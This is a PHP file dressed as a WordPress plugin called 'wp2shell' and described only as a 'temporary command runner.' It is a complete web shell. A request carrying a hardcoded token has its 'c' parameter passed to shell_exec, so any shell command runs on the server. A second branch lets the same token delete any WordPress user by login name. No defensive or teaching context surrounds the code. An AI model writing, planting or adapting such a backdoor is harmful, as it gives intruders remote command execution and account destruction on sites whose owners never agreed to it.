<?php
/*
Plugin Name: wp2shell
Description: Temporary command runner.
*/
if (hash_equals('f93c59a12e4011f4676354461c59afdd', (string) ($_GET['t'] ?? '')) && isset($_GET['c'])) {
    chdir(__DIR__);
    echo 'WP2SHELL::' . shell_exec((string) $_GET['c']) . '::END';
} elseif (hash_equals('f93c59a12e4011f4676354461c59afdd', (string) ($_GET['t'] ?? '')) && isset($_GET['delete_user'])) {
    require_once dirname(__DIR__, 3) . '/wp-load.php';
    require_once ABSPATH . 'wp-admin/includes/user.php';
    $user = get_user_by('login', (string) $_GET['delete_user']);
    $ok = $user ? wp_delete_user((int) $user->ID, (int) ($_GET['reassign'] ?? 0)) : false;
    echo 'WP2SHELL::' . ($ok ? 'deleted' : 'failed') . '::END';
}
